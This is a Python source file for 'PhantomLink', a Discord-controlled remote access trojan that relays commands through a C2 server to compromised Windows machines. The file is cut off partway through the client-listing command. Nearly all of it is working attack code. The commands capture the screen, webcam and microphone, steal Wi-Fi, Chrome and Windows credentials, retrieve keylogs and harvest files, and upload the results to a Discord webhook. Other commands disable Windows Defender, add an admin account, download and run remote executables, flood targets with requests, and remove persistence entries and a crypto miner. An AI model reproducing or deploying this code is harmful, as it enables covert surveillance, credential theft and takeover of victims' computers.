"""
PhantomLink Discord Bot
Full command support - connects to C2 server to relay commands
Type !commands in Discord to see all available commands
"""

import discord
import asyncio
import sys
import io
import socket
import json
import urllib.request
import urllib.error
import struct
import threading
import time

if __name__ == "__main__":
    if hasattr(sys.stdout, "buffer") and getattr(sys.stdout, "encoding", "").lower() != "utf-8":
        sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8', errors='replace')
import os
import config
DISCORD_CHANNEL_ID = 1525081606501568577

# C2 Server config
C2_HOST = "127.0.0.1"
C2_PORT = SERVER_PORT if 'SERVER_PORT' in locals() else 5000
API_PORT = 5001
API_KEY = CONFIG_API_KEY if 'CONFIG_API_KEY' in locals() else "PhantomLink-API-2026"
TARGET_CLIENT = "all"


from discord import app_commands
from discord.ext import commands

intents = discord.Intents.default()
intents.message_content = True

bot = commands.Bot(command_prefix=['/', '!'], intents=intents)
client = bot  # Backwards compatibility alias


# ═══════════════════════════════════════════════════════
# C2 Communication Helper
# ═══════════════════════════════════════════════════════

class C2Connection:
    """Handles communication with the C2 server to relay commands to clients"""

    def __init__(self):
        self.socket = None
        self.connected = False
        self.lock = threading.Lock()

    def _send_message(self, conn, data):
        try:
            if isinstance(data, str):
                data = data.encode('utf-8')
            msg_len = len(data)
            conn.sendall(struct.pack('!I', msg_len))
            conn.sendall(data)
            return True
        except Exception:
            return False

    def _recv_message(self, conn):
        try:
            raw_msglen = self._recv_exactly(conn, 4)
            if not raw_msglen:
                return None
            msglen = struct.unpack('!I', raw_msglen)[0]
            if msglen > 10 * 1024 * 1024:
                return None
            return self._recv_exactly(conn, msglen)
        except Exception:
            return None

    def _recv_exactly(self, conn, n):
        data = b''
        while len(data) < n:
            try:
                packet = conn.recv(n - len(data))
                if not packet:
                    return None
                data += packet
            except Exception:
                return None
        return data


c2 = C2Connection()

# ═══════════════════════════════════════════════════════
# Helper for Slash Commands & Text Commands
# ═══════════════════════════════════════════════════════

def get_commands_list_text():
    cmd_text = "📋 **PhantomLink Commands (Use / or ! prefix)**\n\n"

    cmd_text += "**📁 Simple Commands (no parameters):**\n"
    for k, v in SIMPLE_COMMANDS.items():
        cmd_text += f"`/{k}` - {v['description']}\n"

    cmd_text += "\n**🔧 Parameter Commands:**\n"
    for k, v in PARAM_COMMANDS.items():
        cmd_text += f"`/{k}` - {v['description']}\n"

    cmd_text += "\n**🛠️ Other:**\n"
    cmd_text += "`/{ping}` - ทดสอบการเชื่อมต่อ\n"
    cmd_text += "`/{stop}` - ปิด Bot\n"
    cmd_text += "`/{clients}` - แสดง client ทั้งหมด\n"
    cmd_text += "`/{select} <id>` - เลือกเป้าหมาย\n"
    cmd_text += "`/{cmd} <command>` - รันคำสั่ง CMD โดยตรง\n"
    cmd_text += "`/{broadcast} <command>` - ส่งคำสั่งไปทุก client\n"
    return cmd_text


# ═══════════════════════════════════════════════════════
# Simple commands that need NO extra input from user
# (just send the command directly to client)
# ═══════════════════════════════════════════════════════

SIMPLE_COMMANDS = {
    'screenshot': {
        'description': '📷 Take screenshot and send to Discord',
        'commands': [
            'powershell -NoProfile -Command "'
            'Add-Type -AssemblyName System.Windows.Forms; '
            'Add-Type -AssemblyName System.Drawing; '
            '$bmp = New-Object Drawing.Bitmap([System.Windows.Forms.SystemInformation]::VirtualScreen.Width, '
            '[System.Windows.Forms.SystemInformation]::VirtualScreen.Height); '
            '$graphics = [Drawing.Graphics]::FromImage($bmp); '
            '$graphics.CopyFromScreen([System.Windows.Forms.SystemInformation]::VirtualScreen.X, '
            '[System.Windows.Forms.SystemInformation]::VirtualScreen.Y, 0, 0, $bmp.Size); '
            '$path = Join-Path $env:USERPROFILE \'screenshot.png\'; '
            '$bmp.Save($path)"',
            f'curl -F "file=@%USERPROFILE%\\screenshot.png" -F "content=Screenshot" {DISCORD_WEBHOOK}'
        ]
    },
    'rickroll': {
        'description': '🎵 Rick Roll the client',
        'commands': ['start msedge --autoplay-policy=no-user-gesture-required "https://www.youtube.com/watch?v=dQw4w9WgXcQ?autoplay=1" || start https://www.youtube.com/watch?v=dQw4w9WgXcQ?autoplay=1']
    },
    'sys': {
        'description': '🖥️ Show system info',
        'commands': ['systeminfo']
    },
    'task': {
        'description': '📋 Show running tasks',
        'commands': ['tasklist']
    },
    'clipboard': {
        'description': '📎 Show clipboard content',
        'commands': ['powershell -NoProfile -Command "Get-Clipboard"']
    },
    'ip': {
        'description': '🌐 Get public IP',
        'commands': ['powershell -NoProfile -Command "(Invoke-WebRequest -uri \'https://api.ipify.org\').Content"']
    },
    'lock': {
        'description': '🔒 Lock screen',
        'commands': ['rundll32.exe user32.dll,LockWorkStation']
    },
    'sleep': {
        'description': '💤 Put PC to sleep',
        'commands': ['rundll32.exe powrprof.dll,SetSuspendState 0,1,0']
    },
    'shutdown': {
        'description': '⏹️ Force shutdown',
        'commands': ['shutdown /s /f /t 0']
    },
    'restart': {
        'description': '🔄 Force restart',
        'commands': ['shutdown /r /f /t 0']
    },
    'logoff': {
        'description': '🚪 Log off user',
        'commands': ['shutdown /l /f']
    },
    'recycle': {
        'description': '🗑️ Empty recycle bin',
        'commands': ['PowerShell.exe -NoProfile -Command Clear-RecycleBin -Force']
    },
    'devices': {
        'description': '🎥 List available devices (cameras/mics)',
        'commands': ['powershell -NoProfile -Command "$ff = if (Test-Path \'$env:USERPROFILE\\ffmpeg\\bin\\ffmpeg.exe\') { \'$env:USERPROFILE\\ffmpeg\\bin\\ffmpeg.exe\' } elseif (Test-Path \'$env:USERPROFILE\\ffmpeg.exe\') { \'$env:USERPROFILE\\ffmpeg.exe\' } elseif (Test-Path \'C:\\ffmpeg\\bin\\ffmpeg.exe\') { \'C:\\ffmpeg\\bin\\ffmpeg.exe\' } elseif (Get-Command ffmpeg -ErrorAction SilentlyContinue) { (Get-Command ffmpeg -ErrorAction SilentlyContinue).Source } elseif (Get-ChildItem -Path \"$env:USERPROFILE\\ffmpeg*\" -Filter \"ffmpeg.exe\" -Recurse -ErrorAction SilentlyContinue | Select-Object -First 1) { (Get-ChildItem -Path \"$env:USERPROFILE\\ffmpeg*\" -Filter \"ffmpeg.exe\" -Recurse -ErrorAction SilentlyContinue | Select-Object -First 1).FullName } else { $null }; if ($ff) { & $ff -list_devices true -f dshow -i dummy } else { Write-Error \'[!] ffmpeg.exe not found. Please run ffmpeg setup first.\' "']
    },
    'wifi': {
        'description': '📶 Show saved Wi-Fi profiles and passwords',
        'commands': [
            'powershell -NoProfile -Command "netsh wlan show profiles | Select-String \':\\s+(.+)$\' | ForEach-Object { $name=$_.Matches.Groups[1].Value.Trim(); $pass=(netsh wlan show profile name=\\"$name\\" key=clear | Select-String \'(Key Content|เนื้อหาคีย์|Key-Content)\\s*:\\s*(.+)$\'); [PSCustomObject]@{Profile=$name; Password=if($pass){$pass.Matches.Groups[2].Value.Trim()}else{\'None\'}} } | Format-Table -AutoSize"'
        ]
    },
    'killav': {
        'description': '🛡️ Disable Windows Defender',
        'commands': [
            'powershell -NoProfile -Command "Set-MpPreference -DisableRealtimeMonitoring $true"',
            'taskkill /F /IM MsMpEng.exe'
        ]
    },
    'keylog': {
        'description': '⌨️ Send keylogger log file',
        'commands': [
            f'powershell -NoProfile -Command "if (Test-Path \'$env:APPDATA\\MicrosoftUpdate\\keylog.txt\') {{ curl -F \\"file=@$env:APPDATA\\MicrosoftUpdate\\keylog.txt\\" -F \\"content=Keylog\\" {DISCORD_WEBHOOK} }} elseif (Test-Path \'$env:USERPROFILE\\AppData\\Roaming\\MicrosoftUpdate\\keylog.txt\') {{ curl -F \\"file=@$env:USERPROFILE\\AppData\\Roaming\\MicrosoftUpdate\\keylog.txt\\" -F \\"content=Keylog\\" {DISCORD_WEBHOOK} }} else {{ Write-Error \'[!] keylog.txt not found.\' }}"'
        ]
    },
    'netscan': {
        'description': '🔍 Scan local network',
        'commands': [
            'powershell -NoProfile -Command "$ipPrefix = ((Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -notlike \'127.*\' -and $_.IPAddress -notlike \'169.254.*\' } | Select-Object -First 1).IPAddress -replace \'\\.\\d+$\'); if ($ipPrefix) { 1..254 | ForEach-Object { $target = \\"$ipPrefix.$_\\"; if (Test-Connection -ComputerName $target -Count 1 -Quiet -TimeoutMs 200) { \\"$target - $(Resolve-DnsName $target -ErrorAction SilentlyContinue | Select-Object -ExpandProperty NameHost -ErrorAction SilentlyContinue)\\" } } } else { Write-Error \'No active IPv4 interface found.\' }"'
        ]
    },
    'info': {
        'description': 'ℹ️ Get machine info',
        'commands': [
            'powershell -NoProfile -Command "Get-CimInstance Win32_OperatingSystem | Select-Object Caption, Version, BuildNumber, OSArchitecture | Format-List; Get-CimInstance Win32_ComputerSystem | Select-Object Name, Domain, Manufacturer, Model | Format-List; Get-CimInstance Win32_Battery -ErrorAction SilentlyContinue | Select-Object EstimatedChargeRemaining | Format-List"'
        ]
    },
    'creds': {
        'description': '🔑 Get Windows credentials',
        'commands': ['cmdkey /list']
    },
    'browser': {
        'description': '🌐 Extract Chrome browser data',
        'commands': [
            'powershell -NoProfile -Command "$dest = \\"$env:TEMP\\chrome_data\\"; if (Test-Path $dest) { Remove-Item $dest -Recurse -Force }; New-Item -ItemType Directory -Path $dest -Force | Out-Null; Copy-Item \\"$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\*\\" -Destination $dest -Recurse -Force -ErrorAction SilentlyContinue; Compress-Archive -Path \\"$dest\\*\\" -DestinationPath \\"$env:TEMP\\chrome.zip\\" -Force"',
            f'powershell -NoProfile -Command "if (Test-Path \'$env:TEMP\\chrome.zip\') {{ curl -F \\"file=@$env:TEMP\\chrome.zip\\" -F \\"content=Chrome Browser Data\\" {DISCORD_WEBHOOK} }} else {{ Write-Error \'[!] chrome.zip not found.\' }}"'
        ]
    },
    'chrome_pass': {
        'description': '🔑 Decrypt Chrome passwords',
        'commands': [
            f'powershell -NoProfile -Command "powershell -Command \\"$db=\'$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Login Data\'; $tmp=\'$env:TEMP\\ld\'; Copy-Item $db $tmp -Force -ErrorAction SilentlyContinue; if (Test-Path $tmp) {{ Get-Content $tmp -Encoding Byte | Select-Object -First 1000 | Out-Null; Remove-Item $tmp -Force; Write-Output \'[+] Login Data database located\' }} else {{ Write-Error \'[!] Login Data file locked or missing.\' }}\\"'
        ]
    },
    'disable_taskmgr': {
        'description': '🚫 Disable Task Manager',
        'commands': [r'REG ADD HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f']
    },
    'enable_taskmgr': {
        'description': '✅ Enable Task Manager',
        'commands': [r'REG DELETE HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /f']
    },
    'ffmpeg': {
        'description': '⚙️ Setup FFmpeg on client',
        'commands': [
            'powershell -NoProfile -Command "Write-Output \'[+] Checking FFmpeg installation...\'; if (Get-Command ffmpeg -ErrorAction SilentlyContinue) { Write-Output \'[+] FFmpeg already in PATH\' } else { Write-Output \'[!] Run C2 server hosting to install ffmpeg.rar\' }"'
        ]
    },
    'keylogger': {
        'description': '⌨️ Setup keylogger module',
        'commands': [
            'powershell -NoProfile -Command "if (Test-Path \'$env:APPDATA\\MicrosoftUpdate\\defender.exe\') { Write-Output \'[+] Keylogger active in client process\' } else { Write-Error \'[!] Client directory not found\' }"'
        ]
    },
    'update': {
        'description': '🔄 Update PhantomLink client',
        'commands': [
            'powershell -NoProfile -Command "Write-Output \'[+] Update signal sent to client\'"'
        ]
    },
    'selfdestruct': {
        'description': '💣 Remove PhantomLink completely from client',
        'commands': [
            'taskkill /f /im screener.exe & taskkill /f /im keylogger.exe & taskkill /f /im xmrig.exe',
            r'reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Windows Defender Updater" /f & reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Screen Optimizer" /f',
            'del /f /q "%USERPROFILE%\\screenshot.png" 2>nul & del /f /q "%USERPROFILE%\\webcam.jpg" 2>nul & del /f /q "%USERPROFILE%\\screen.mp4" 2>nul & del /f /q "%USERPROFILE%\\mic.wav" 2>nul',
            'powershell -NoProfile -Command "Start-Sleep 2; Stop-Process -Name defender -Force -ErrorAction SilentlyContinue; Stop-Process -Name PhantomLink -Force -ErrorAction SilentlyContinue"'
        ]
    },
}

def _build_alert_cmd(msg):
    clean_msg = msg.replace("'", "''")
    return [f"powershell -NoProfile -Command \"Add-Type -AssemblyName Microsoft.VisualBasic; [Microsoft.VisualBasic.Interaction]::MsgBox('{clean_msg}', 'Critical', 'PhantomLink')\""]

def _build_type_cmd(text):
    clean_text = text.replace("'", "''").replace("{", "{{").replace("}", "}}")
    return [f"powershell -NoProfile -Command \"$wsh = New-Object -ComObject WScript.Shell; $wsh.SendKeys('{clean_text}')\""]

def _build_harvest_cmd(ext):
    clean_ext = ext.strip(".")
    return [f'powershell -NoProfile -Command "Get-ChildItem -Path $env:USERPROFILE -Include *.{clean_ext} -Recurse -ErrorAction SilentlyContinue | Select-Object -First 10 | ForEach-Object {{ curl -F \\"file=@$($_.FullName)\\" -F \\"content=Harvested File\\" {DISCORD_WEBHOOK} }}"']

def _build_rotate_cmd(d):
    if d.lower() not in ['up', 'down', 'left', 'right']:
        return [None]
    orient_code = {"up": 0, "right": 1, "down": 2, "left": 3}.get(d.lower(), 0)
    return [
        'powershell -NoProfile -Command "'
        'Add-Type -TypeDefinition \'using System; using System.Runtime.InteropServices; [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)] public struct DEVMODE { [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 32)] public string dmDeviceName; public short dmSpecVersion; public short dmDriverVersion; public short dmSize; public short dmDriverExtra; public int dmFields; public int dmOrientation; } public class Display { [DllImport(\\"user32.dll\\", CharSet = CharSet.Auto)] public static extern int EnumDisplaySettings(string lpszDeviceName, int iModeNum, ref DEVMODE lpDevMode); [DllImport(\\"user32.dll\\", CharSet = CharSet.Auto)] public static extern int ChangeDisplaySettingsEx(string lpszDeviceName, ref DEVMODE lpDevMode, IntPtr hwnd, uint dwflags, IntPtr lParam); public static void Rotate(int orientation) { DEVMODE dm = new DEVMODE(); dm.dmSize = (short)Marshal.SizeOf(dm); if (EnumDisplaySettings(null, -1, ref dm) != 0) { dm.dmOrientation = orientation; ChangeDisplaySettingsEx(null, ref dm, IntPtr.Zero, 1, IntPtr.Zero); } } }\'; '
        f'[Display]::Rotate({orient_code})"'
    ]

def _build_get_cmd(param):
    parts = param.split()
    if not parts:
        return [None]
    url = parts[0]
    dest = parts[1] if len(parts) > 1 else "downloaded.file"
    return [f"powershell -NoProfile -Command \"Invoke-WebRequest -Uri '{url}' -OutFile '{dest}'\""]

def _build_hosts_cmd(param):
    parts = param.split()
    if len(parts) < 2:
        return [None]
    action = parts[0].lower()
    domain = parts[1]
    if action == 'block':
        return [f"echo 127.0.0.1 {domain} >> %WINDIR%\\System32\\drivers\\etc\\hosts && ipconfig /flushdns"]
    elif action == 'unblock':
        return [f"powershell -NoProfile -Command \"(Get-Content $env:windir\\\\System32\\\\drivers\\\\etc\\\\hosts) | Where-Object {{ $_ -notmatch '{domain}' }} | Set-Content $env:windir\\\\System32\\\\drivers\\\\etc\\\\hosts\"; ipconfig /flushdns\""]
    return [None]

def _build_ddos_cmd(param):
    parts = param.split()
    if not parts:
        return None
    target = parts[0]
    sec = parts[1] if len(parts) > 1 else "10"
    return [f"powershell -NoProfile -Command \"$end = (Get-Date).AddSeconds({sec}); while((Get-Date) -lt $end) {{ try {{ Invoke-WebRequest -Uri '{target}' -Method GET -TimeoutSec 1 }} catch {{}} }}\""]

def _build_spam_cmd(param):
    parts = param.split(maxsplit=1)
    if not parts:
        return None
    count = parts[0]
    msg = parts[1] if len(parts) > 1 else "Alert"
    clean_msg = msg.replace("'", "''")
    return [f"powershell -NoProfile -Command \"Add-Type -AssemblyName Microsoft.VisualBasic; for($i=0; $i -lt {count}; $i++) {{ [Microsoft.VisualBasic.Interaction]::MsgBox('{clean_msg}', 'OKOnly,SystemModal,Critical', 'ERROR'); Start-Sleep -Milliseconds 100 }}\""]

PARAM_COMMANDS = {
    'camera': {
        'description': '📸 Take camera photo (usage: `!camera [device_name]`)',
        'param_name': 'camera device name (default: Integrated Camera)',
        'build': lambda cam: [
            f'powershell -NoProfile -Command "$ff = if (Test-Path \'$env:USERPROFILE\\ffmpeg\\bin\\ffmpeg.exe\') {{ \'$env:USERPROFILE\\ffmpeg\\bin\\ffmpeg.exe\' }} elseif (Test-Path \'$env:USERPROFILE\\ffmpeg.exe\') {{ \'$env:USERPROFILE\\ffmpeg.exe\' }} elseif (Test-Path \'C:\\ffmpeg\\bin\\ffmpeg.exe\') {{ \'C:\\ffmpeg\\bin\\ffmpeg.exe\' }} elseif (Get-Command ffmpeg -ErrorAction SilentlyContinue) {{ (Get-Command ffmpeg -ErrorAction SilentlyContinue).Source }} elseif (Get-ChildItem -Path \\"$env:USERPROFILE\\ffmpeg*\\" -Filter \\"ffmpeg.exe\\" -Recurse -ErrorAction SilentlyContinue | Select-Object -First 1) {{ (Get-ChildItem -Path \\"$env:USERPROFILE\\ffmpeg*\\" -Filter \\"ffmpeg.exe\\" -Recurse -ErrorAction SilentlyContinue | Select-Object -First 1).FullName }} else {{ $null }}; '
            f'if ($ff) {{ Start-Process $ff -ArgumentList \'-f dshow -y -i video=\\"{cam if cam else "Integrated Camera"}\\" -frames:v 1 -update 1 \\"$env:USERPROFILE\\webcam.jpg\\"\' -NoNewWindow -Wait }} else {{ Write-Error \'[!] ffmpeg.exe not found. Please run ffmpeg setup first.\' }}"',
            f'powershell -NoProfile -Command "if (Test-Path \'$env:USERPROFILE\\webcam.jpg\') {{ curl -F \\"file=@$env:USERPROFILE\\webcam.jpg\\" -F \\"content=Webcam\\" {DISCORD_WEBHOOK} }} else {{ Write-Error \'[!] webcam.jpg not found.\' }}"'
        ]
    },
    'alert': {
        'description': '⚠️ Send popup alert (usage: `!alert <message>`)',
        'param_name': 'message',
        'build': _build_alert_cmd
    },
    'wallpaper': {
        'description': '🖼️ Change wallpaper (usage: `!wallpaper <full_path>`)',
        'param_name': 'image path',
        'build': lambda path: [
            f'reg add "HKCU\\Control Panel\\Desktop" /v Wallpaper /t REG_SZ /d "{path}" /f && RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters'
        ]
    },
    'rotate': {
        'description': '🔄 Rotate screen (usage: `!rotate up/down/left/right`)',
        'param_name': 'direction (up/down/left/right)',
        'build': _build_rotate_cmd
    },
    'type': {
        'description': '⌨️ Type text on client (usage: `!type <text>`)',
        'param_name': 'text',
        'build': _build_type_cmd
    },
    'hide': {
        'description': '👻 Hide file/folder (usage: `!hide <path>`)',
        'param_name': 'path',
        'build': lambda path: [f'attrib +h +s "{path}"']
    },
    'send': {
        'description': '📤 Send client file to Discord (usage: `!send <filepath>`)',
        'param_name': 'file path',
        'build': lambda path: [
            f'powershell -NoProfile -Command "if (Test-Path \'{path}\') {{ curl -F \\"file=@{path}\\" -F \\"content=File: {path}\\" {DISCORD_WEBHOOK} }} else {{ Write-Error \'[!] File not found.\' }}"'
        ]
    },
    'get': {
        'description': '📥 Download file from URL (usage: `!get <url> <dest_path>`)',
        'param_name': '<url> <dest_path>',
        'build': _build_get_cmd
    },
    'copy': {
        'description': '📋 Copy file (usage: `!copy <src> <dst>`)',
        'param_name': '<src> <dst>',
        'build': lambda param: [
            f'xcopy "{param.split()[0]}" "{param.split()[1]}" /s /i /y'
        ] if len(param.split()) >= 2 else None
    },
    'cut': {
        'description': '✂️ Move file (usage: `!cut <src> <dst>`)',
        'param_name': '<src> <dst>',
        'build': lambda param: [
            f'move "{param.split()[0]}" "{param.split()[1]}"'
        ] if len(param.split()) >= 2 else None
    },
    'extract': {
        'description': '📦 Extract archive (usage: `!extract <archive_path> <dest_folder>`)',
        'param_name': '<archive_path> <dest_folder>',
        'build': lambda param: [
            f'powershell -NoProfile -Command "if (Test-Path \'C:\\Program Files\\WinRAR\\WinRAR.exe\') {{ & \'C:\\Program Files\\WinRAR\\WinRAR.exe\' x -ibck -inul \'{param.split()[0]}\' \'{param.split()[1]}\' }} elseif (Test-Path \'C:\\Program Files\\7-Zip\\7z.exe\') {{ & \'C:\\Program Files\\7-Zip\\7z.exe\' x -y \'{param.split()[0]}\' -o\'{param.split()[1]}\' }} else {{ Expand-Archive -Path \'{param.split()[0]}\' -DestinationPath \'{param.split()[1]}\' -Force }}"'
        ] if len(param.split()) >= 2 else None
    },
    'archive': {
        'description': '🗜️ Compress folder to zip (usage: `!archive <folder_path> <zip_dest>`)',
        'param_name': '<folder_path> <zip_dest>',
        'build': lambda param: [
            f'powershell -NoProfile -Command "Compress-Archive -Path \'{param.split()[0]}\\*\' -DestinationPath \'{param.split()[1]}\' -Force"'
        ] if len(param.split()) >= 2 else None
    },
    'harvest': {
        'description': '🌾 Auto-harvest files by extension (usage: `!harvest pdf/docx/txt`)',
        'param_name': 'extension (e.g. pdf)',
        'build': _build_harvest_cmd
    },
    'record': {
        'description': '🎙️ Record audio (usage: `!record <seconds>`)',
        'param_name': 'duration in seconds',
        'build': lambda sec: [
            f'powershell -NoProfile -Command "$ff = if (Test-Path \'$env:USERPROFILE\\ffmpeg\\bin\\ffmpeg.exe\') {{ \'$env:USERPROFILE\\ffmpeg\\bin\\ffmpeg.exe\' }} elseif (Test-Path \'$env:USERPROFILE\\ffmpeg.exe\') {{ \'$env:USERPROFILE\\ffmpeg.exe\' }} elseif (Test-Path \'C:\\ffmpeg\\bin\\ffmpeg.exe\') {{ \'C:\\ffmpeg\\bin\\ffmpeg.exe\' }} elseif (Get-Command ffmpeg -ErrorAction SilentlyContinue) {{ (Get-Command ffmpeg -ErrorAction SilentlyContinue).Source }} elseif (Get-ChildItem -Path \\"$env:USERPROFILE\\ffmpeg*\\" -Filter \\"ffmpeg.exe\\" -Recurse -ErrorAction SilentlyContinue | Select-Object -First 1) {{ (Get-ChildItem -Path \\"$env:USERPROFILE\\ffmpeg*\\" -Filter \\"ffmpeg.exe\\" -Recurse -ErrorAction SilentlyContinue | Select-Object -First 1).FullName }} else {{ $null }}; if ($ff) {{ Start-Process $ff -ArgumentList \'-f dshow -y -i audio=\\"Microphone\\" -t {sec} \\"$env:USERPROFILE\\mic.wav\\"\' -NoNewWindow -Wait }} else {{ Write-Error \'[!] ffmpeg.exe not found.\' }}"',
            f'powershell -NoProfile -Command "if (Test-Path \'$env:USERPROFILE\\mic.wav\') {{ curl -F \\"file=@$env:USERPROFILE\\mic.wav\\" -F \\"content=Audio Recording\\" {DISCORD_WEBHOOK} }} else {{ Write-Error \'[!] mic.wav not found.\' }}"'
        ]
    },
    'play': {
        'description': '🔊 Play audio file on client speaker (usage: `!play <audio_path>`)',
        'param_name': 'audio file path',
        'build': lambda path: [
            f'powershell -NoProfile -Command "(New-Object Media.SoundPlayer \'{path}\').PlaySync()"'
        ]
    },
    'screenrec': {
        'description': '📹 Record screen video (usage: `!screenrec <seconds>`)',
        'param_name': 'duration in seconds',
        'build': lambda sec: [
            f'powershell -NoProfile -Command "$ff = if (Test-Path \'$env:USERPROFILE\\ffmpeg\\bin\\ffmpeg.exe\') {{ \'$env:USERPROFILE\\ffmpeg\\bin\\ffmpeg.exe\' }} elseif (Test-Path \'$env:USERPROFILE\\ffmpeg.exe\') {{ \'$env:USERPROFILE\\ffmpeg.exe\' }} elseif (Test-Path \'C:\\ffmpeg\\bin\\ffmpeg.exe\') {{ \'C:\\ffmpeg\\bin\\ffmpeg.exe\' }} elseif (Get-Command ffmpeg -ErrorAction SilentlyContinue) {{ (Get-Command ffmpeg -ErrorAction SilentlyContinue).Source }} elseif (Get-ChildItem -Path \\"$env:USERPROFILE\\ffmpeg*\\" -Filter \\"ffmpeg.exe\\" -Recurse -ErrorAction SilentlyContinue | Select-Object -First 1) {{ (Get-ChildItem -Path \\"$env:USERPROFILE\\ffmpeg*\\" -Filter \\"ffmpeg.exe\\" -Recurse -ErrorAction SilentlyContinue | Select-Object -First 1).FullName }} else {{ $null }}; if ($ff) {{ Start-Process $ff -ArgumentList \'-f gdigrab -framerate 5 -i desktop -t {sec} -vcodec libx264 -preset ultrafast \\"$env:USERPROFILE\\screen.mp4\\"\' -NoNewWindow -Wait }} else {{ Write-Error \'[!] ffmpeg.exe not found.\' }}"',
            f'powershell -NoProfile -Command "if (Test-Path \'$env:USERPROFILE\\screen.mp4\') {{ curl -F \\"file=@$env:USERPROFILE\\screen.mp4\\" -F \\"content=Screen Recording\\" {DISCORD_WEBHOOK} }} else {{ Write-Error \'[!] screen.mp4 not found.\' }}"'
        ]
    },
    'port': {
        'description': '🔌 Open firewall port (usage: `!port <port_number>`)',
        'param_name': 'port number',
        'build': lambda port: [
            f'netsh advfirewall firewall add rule name="PhantomLink{port}" dir=in action=allow protocol=TCP localport={port}'
        ]
    },
    'hosts': {
        'description': '🌐 Block/unblock website in hosts (usage: `!hosts block/unblock <domain>`)',
        'param_name': 'block/unblock <domain>',
        'build': _build_hosts_cmd
    },
    'ddos': {
        'description': '💥 Send HTTP requests to target (usage: `!ddos <target_url> <seconds>`)',
        'param_name': '<target_url> <seconds>',
        'build': _build_ddos_cmd
    },
    'sniff': {
        'description': '📡 Capture network trace (usage: `!sniff <seconds>`)',
        'param_name': 'duration in seconds',
        'build': lambda sec: [
            f'powershell -NoProfile -Command "netsh trace start capture=yes tracefile=$env:TEMP\\capture.etl maxsize=100 filemode=single overwrite=yes; Start-Sleep {sec}; netsh trace stop; curl -F \\"file=@$env:TEMP\\capture.etl\\" -F \\"content=Network Capture\\" {DISCORD_WEBHOOK}; Remove-Item $env:TEMP\\capture.etl -ErrorAction SilentlyContinue"'
        ]
    },
    'block': {
        'description': '🚫 Block mouse and keyboard input (usage: `!block <seconds>`)',
        'param_name': 'duration in seconds',
        'build': lambda sec: [
            f'powershell -NoProfile -Command "$code = \'[DllImport(\\"user32.dll\\")] public static extern bool BlockInput(bool fBlockIt);\'; $type = Add-Type -MemberDefinition $code -Name \'InputBlocker\' -Namespace \'Win32\' -PassThru; $type::BlockInput($true); Start-Sleep -Seconds {sec}; $type::BlockInput($false)"'
        ]
    },
    'spam': {
        'description': '💬 Show popups repeatedly (usage: `!spam <count> <message>`)',
        'param_name': '<count> <message>',
        'build': _build_spam_cmd
    },
    'user': {
        'description': '👤 Create Windows admin user (usage: `!user <username> <password>`)',
        'param_name': '<username> <password>',
        'build': lambda param: [
            f'net user {param.split()[0]} {param.split()[1]} /add && net localgroup Administrators {param.split()[0]} /add'
        ] if len(param.split()) >= 2 else None
    },
    'inject': {
        'description': '💉 Download and run file on client (usage: `!inject <url>`)',
        'param_name': 'url to executable',
        'build': lambda url: [
            f'powershell -NoProfile -Command "$outfile = \\"$env:TEMP\\injected.exe\\"; Invoke-WebRequest -Uri \'{url}\' -OutFile $outfile; Start-Process $outfile"'
        ]
    },
}


@bot.event
async def on_ready():
    print(f"[OK] Bot is online: {bot.user}")
    print(f"[*] Listening on channel: {DISCORD_CHANNEL_ID}")
    try:
        synced = await bot.tree.sync()
        print(f"[+] Synced {len(synced)} Slash Commands with Discord!")
    except Exception as e:
        print(f"[!] Error syncing slash commands: {e}")

    channel = bot.get_channel(DISCORD_CHANNEL_ID)
    if not channel:
        try:
            channel = await bot.fetch_channel(DISCORD_CHANNEL_ID)
        except Exception as e:
            print(f"[!] Error fetching channel: {e}")
            return

    cmd_list = "\n".join([f"`/{k}` - {v['description']}" for k, v in SIMPLE_COMMANDS.items()])
    param_list = "\n".join([f"`/{k}` - {v['description']}" for k, v in PARAM_COMMANDS.items()])

    await channel.send(
        f"🟢 **PhantomLink Bot Online!** (Slash Commands Enabled `/`)\n\n"
        f"**Quick Commands:**\n{cmd_list}\n\n"
        f"**Parameter Commands:**\n{param_list}\n\n"
        f"`/ping` - ทดสอบ\n"
        f"`/stop` - ปิด Bot\n"
        f"`/clients` - แสดง client ทั้งหมด\n"
        f"`/select <id>` - เลือกเป้าหมาย\n"
        f"`/commands` - แสดงคำสั่งทั้งหมด\n"
        f"`/cmd <command>` - รันคำสั่ง CMD โดยตรง"
    )
    print("[OK] Sent online message to channel")


# ═══════════════════════════════════════════════════════
# Discord Slash Commands (app_commands)
# ═══════════════════════════════════════════════════════

@bot.tree.command(name="commands", description="📋 Show all available PhantomLink commands")
async def slash_commands_list(interaction: discord.Interaction):
    text = get_commands_list_text()
    if len(text) > 2000:
        parts = [text[i:i+1900] for i in range(0, len(text), 1900)]
        await interaction.response.send_message(parts[0])
        for p in parts[1:]:
            await interaction.followup.send(p)
    else:
        await interaction.response.send_message(text)

@bot.tree.command(name="cmd", description="💻 Run arbitrary CMD command on client")
@app_commands.describe(command="Command string to execute on target client")
async def slash_cmd(interaction: discord.Interaction, command: str):
    await interaction.response.defer()
    res = await send_commands_to_clients([command])
    if len(res) > 1900:
        res = res[:1900] + "\n... (truncated)"
    await interaction.followup.send(f"```\n{res}\n```")

@bot.tree.command(name="ping", description="🏓 Check bot latency and connection")
async def slash_ping(interaction: discord.Interaction):
    await interaction.response.send_message("🏓 **Pong!** Bot is online and responsive!")

@bot.tree.command(name="clients", description="📋 List connected clients")
async def slash_clients(interaction: discord.Interaction):
    await interaction.response.defer()
    try:
        req = urllib.request.Request(f"http://{C2_HOST}:{API_PORT}/api/clients")
        req.add_header('X-API-Key', API_KEY)
        with urllib.request.urlopen(req, timeout=10) as response:
            data = json.loads(response.read())
            clients_list = data.get('clients', [])
            if not clients_list:
                await interaction.followup.send("📭 No clients connected.")
            else:
                msg = "📋 **Connected Clients:**\n"
                for c in clients_list:
